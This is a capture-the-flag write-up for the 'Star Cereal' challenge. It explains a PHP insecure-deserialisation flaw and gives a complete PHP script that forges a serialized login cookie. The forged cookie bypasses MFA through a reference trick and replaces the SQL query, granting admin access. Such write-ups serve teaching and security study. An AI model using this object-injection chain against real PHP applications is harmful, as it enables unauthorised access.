<hr />

<h2>description: PHP insecure deserialisation vulnerability</h2>

<h1>Star Cereal</h1>

<h2>Description</h2>

<p>Have you heard of Star Cereal? It's a new brand of cereal that's been rapidly gaining popularity amongst astronauts - so much so that their devs had to scramble to piece together a website for their business! The stress must have really gotten to them though, because a junior dev accidentally leaked part of the source code...</p>

<p><code>http://20.198.209.142:55043</code></p>

<p><em>The flag is in the flag format: STC{...}</em></p>

<p><strong>Author: zeyu2001</strong></p>

<p>{% file src="../../.gitbook/assets/process<em>login.php" %}
process</em>login.php
{% endfile %}</p>

<h2>Solution</h2>

<p>The goal of this challenge is to perform an authentication bypass through a PHP object injection vulnerability. There are three classes involved, and each one of them needs to be examined to construct a "POP chain" for successful exploitation.</p>

<p>We are given the following page:</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-07-24 at 11.44.41 AM.png" alt="" /></p>

<p>Going over to the login page, we see the following 3 fields.</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-07-24 at 11.45.15 AM.png" alt="" /></p>

<h3>Source Code Inspection</h3>

<p>At the bottom of the provided source code, we see the logic behind the application's authentication.</p>

<p>```php
// Verify login
if(isset($<em>COOKIE["login"])){
    try
    {
        $login = unserialize(base64</em>decode(urldecode($<em>COOKIE["login"])));
        if ($login->verifyLogin())
        {
            $</em>SESSION['admin'] = true;
        }
        else
        {
            $<em>SESSION['admin'] = false;
        }
    }
    catch (Error $e)
    {
        $</em>SESSION['admin'] = false;
    }
}</p>

<p>// Handle form submission
if (isset($<em>POST['email']) &amp;&amp; isset($</em>POST['pass']) &amp;&amp; isset($<em>POST['token']))
{
    $login = new Login(new User($</em>POST['email'], $<em>POST['pass']), $</em>POST['token']);
    setcookie("login", urlencode(base64_encode(serialize($login))), time() + (86400 * 30), "/");
    header("Refresh:0");
    die();
}
```</p>

<p>The <code>login</code> cookie is deserialized into a <code>Login</code> object. This should already sound some alarm bells!</p>

<p>The <code>Login</code> object consists of a <code>User</code> object and an MFA token. The <code>$mfa_token</code> is checked against an integer <code>$_correctValue</code> randomly generated at runtime. If the check passes, the user credentials are then checked.</p>

<p>```php
class Login
{
    public $user;
    public $mfa_token;</p>

<pre><code>protected $_correctValue;

function __construct($user, $mfa_token)
{
    $this-&gt;user = $user;
    $this-&gt;mfa_token = $mfa_token;
}

function verifyLogin()
{
    $this-&gt;_correctValue = random_int(1e10, 1e11 - 1);
    if ($this-&gt;mfa_token === $this-&gt;_correctValue)
    {
        return $this-&gt;user-&gt;is_admin();
    }
}
</code></pre>

<p>}
```</p>

<p>Interestingly, the <code>User</code> class instantiates a <code>SQL</code> object, and uses it to execute SQL queries to authenticate the user. If results are returned and consist of the <code>email</code> and <code>password</code> columns, then the authentication is successful.</p>

<p>```php
class User
{
    public $email;
    public $password;</p>

<pre><code>protected $sql;

function __construct($email, $password)
{
    $this-&gt;email = $email;
    $this-&gt;password = $password;
    $this-&gt;sql = new SQL();
}

function __toString() 
{
    return $this-&gt;email . ':' . $this-&gt;password;
}

function is_admin()
{
    $result = $this-&gt;sql-&gt;exec_query($this-&gt;email, $this-&gt;password);

    if ($result &amp;&amp; $row = $result-&gt;fetch_assoc()) {
        if ($row['email'] &amp;&amp; $row['password'])
        {
            return true;
        }
    }
    return false;
}
</code></pre>

<p>}
```</p>

<p>The <code>SQL</code> class contains a <code>$query</code> attribute that is used to generate a prepared statement. Note that if the <code>bind_param()</code> call returns <code>false</code>, the authentication fails. This can happen if, for example, the number of parameters in the prepared statement and the number of variables to bind do not match.</p>

<p>```php
class SQL
{
    protected $query;</p>

<pre><code>function __construct()
{
    $this-&gt;query = "SELECT email, password FROM admins WHERE email=? AND password=?";
}

function exec_query($email, $pass)
{
    $conn = new mysqli("db", getenv("MYSQL_USER"), getenv("MYSQL_PASS"));

    // Check connection
    if ($conn-&gt;connect_error) {
        die("Connection failed. Please inform CTF creators.");
    }

    $stmt = $conn-&gt;prepare($this-&gt;query);

    // Sanity check
    if (! $stmt-&gt;bind_param("ss", $email, $pass))
    {
        return NULL;
    }

    $stmt-&gt;execute();
    $result = $stmt-&gt;get_result();

    return $result;
}
</code></pre>

<p>}
```</p>

<h3>Object Injection</h3>

<p>When user data is deserialized into objects, we can inject custom objects to e.g. modify protected attributes, bypass authentication, etc. We can bypass the above checks by using a "POP chain" of custom objects.</p>

<h4>MFA Token</h4>

<p>The MFA token check can be bypassed if we set <code>$mfa_token</code> as a reference to the <code>$_correctValue</code> attribute using the ampersand (&amp;). Note that in PHP, a reference is simply another variable that points to the same data (unlike pointers in C).</p>

<p>Thus, this will ensure that the two values are always <strong>equal</strong>.</p>

<p>The custom object can be generated as follows:</p>

<p>```php
class Login
{
    public $user;
    public $mfa<em>token;
    protected $</em>correctValue;</p>

<pre><code>function __construct()
{
    $this-&gt;user = new User();
    $this-&gt;mfa_token = &amp;$this-&gt;_correctValue;
}
</code></pre>

<p>}</p>

<p>$login = new Login();
```</p>

<h4>SQL</h4>

<p>Note that the <code>SQL</code> class has a <code>$query</code> attribute that is used in the prepared statement. By simply modifying the <code>$query</code>, we can perform an SQL injection.</p>

<p>To bypass the authentication we simply need a valid result set with <code>email</code> and <code>password</code> columns.</p>

<p>We can use something like</p>

<p><code>sql
SELECT 'dead@beef' AS email, 'l33t' AS password
</code></p>

<p>which will return one row with <code>email</code> and <code>password</code> columns.</p>

<p>Remember the <code>bind_param()</code> check? We still need to make sure that there are two parameters in the prepared statement, so we will do something like this:</p>

<p><code>sql
SELECT ? AS email, ? AS password
</code></p>

<p>any other valid query that makes use of two parameters would work too.</p>

<h3>Exploit</h3>

<p>Using the previously discussed knowledge, it is now trivial to create a solver script that gives us the required base-64 encoded serialized data.</p>

<p>```php
class SQL
{
    protected $query="SELECT ? AS email, ? AS password";
}</p>

<p>class User
{
    public $email = 'dead@beef';
    public $password = 'l33t';
    protected $sql;</p>

<pre><code>function __construct()
{
    $this-&gt;sql = new SQL();
}
</code></pre>

<p>}</p>

<p>class Login
{
    public $user;
    public $mfa<em>token;
    protected $</em>correctValue;</p>

<pre><code>function __construct()
{
    $this-&gt;user = new User();
    $this-&gt;mfa_token = &amp;$this-&gt;_correctValue;
}
</code></pre>

<p>}</p>

<p>$login = new Login();
var<em>dump($login);
echo urlencode(base64</em>encode(serialize($login)));
```</p>

<p>Running the above script gives us the required cookie value.</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-07-24 at 11.50.39 AM.png" alt="" /></p>

<p>Plugging this into the <code>login</code> cookie on our browser, we can login and get the flag.</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-07-24 at 11.51.43 AM.png" alt="" /></p>
